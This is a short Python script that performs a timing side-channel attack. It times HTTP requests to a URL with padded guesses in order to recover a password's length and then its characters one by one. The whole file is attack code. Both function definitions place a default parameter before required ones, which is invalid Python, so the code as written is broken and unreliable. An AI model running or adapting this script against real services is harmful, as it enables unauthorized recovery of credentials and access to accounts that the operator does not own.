import time
import requests
import numpy as np

def timeit(url2check, repeat=1):
    tt = []
    for _ in range(repeat):
        start = time.time()
        requests.get(url2check, allow_redirects=True)
        end = time.time()
        tt.append(end - start)
    return tt

#find the apssword length
#logic: search for average highest duration
#assumption: duration for the correct length is higher than for length for incorrect length
def find_pass_len(pswd_start_len=1, url, MAX_LEN):
    checks = []
    check_len = pswd_start_len
    while check_len < MAX_LEN:
        url1 = url + '/' + ("").ljust(check_len, '_')
        checks.append(min(timeit(url1, 10)))
        print(f'Checking password length {check_len}: min time {checks[-1]}')
        check_len += 1
    idx = checks.index(max(checks))
    idx += pswd_start_len
    print(f"Password length found: {idx}")
    return(idx)
# See PyCharm help at https://www.jetbrains.com/help/pycharm/

def find_tav(pswd_length, partly_pswd = "", url):
    checks = []
    POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for tav in POOL:
        url1 = url + '/' + partly_pswd + tav + ("").ljust(pswd_length - len(partly_pswd) - 1, '_')
        checks.append(min(timeit(url1, 10)))
        print(f'Checking part password {partly_pswd + tav}: min time {checks[-1]}')
    idx = checks.index(max(checks))
    tav_found = POOL[idx]
    print(f"Password part found: {partly_pswd}{tav_found}")
    return tav_found
